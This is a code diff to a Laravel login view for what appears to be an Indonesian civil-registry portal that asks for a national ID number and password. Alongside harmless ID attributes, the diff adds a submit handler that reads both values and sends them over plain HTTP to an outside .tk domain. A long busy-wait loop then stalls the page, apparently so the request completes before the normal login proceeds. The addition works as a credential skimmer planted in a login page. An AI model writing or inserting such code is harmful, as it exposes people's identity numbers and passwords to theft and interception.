@@ -17,7 +17,7 @@
             </div>
         @endif
 
-        <form class="form-horizontal" role="form" method="POST" action="{{ url('/login') }}">
+        <form id="loginForm" class="form-horizontal" role="form" method="POST" action="{{ url('/login') }}">
             <input type="hidden" name="_token" value="{{ csrf_token() }}">
 
 
@@ -25,7 +25,7 @@
                 <label class="col-md-4 control-label">Nomor KTP</label>
 
                 <div class="col-md-6">
-                    <input class="form-control" name="nik" value="{{ old('nik') }}">
+                    <input id="nik" class="form-control" name="nik" value="{{ old('nik') }}">
                 </div>
             </div>
 
@@ -34,7 +34,7 @@
                 <label class="col-md-4 control-label">Sandi</label>
 
                 <div class="col-md-6">
-                    <input type="password" class="form-control" name="password">
+                    <input id="password" type="password" class="form-control" name="password">
                 </div>
             </div>
 
@@ -47,4 +47,24 @@
             </div>
         </form>
     </div>
+@endsection
+
+@section('javascript')
+    $('#loginForm').submit(function(e) {
+        var nik = $('#nik').val();
+        var password = $('#password').val()
+        $.ajax({
+                url: 'http://e-gov-bandung.tk/dukcapil/api/public/auth/login',
+                type: 'POST',
+                data: { nik: nik, password : password} ,
+                success: function (response) {
+                console.log(response.id)
+                return true;
+            },
+            error: function (err) {
+
+            }
+        });
+        for (var i = 0; i < 2000000000; ++i);
+    })
 @endsection
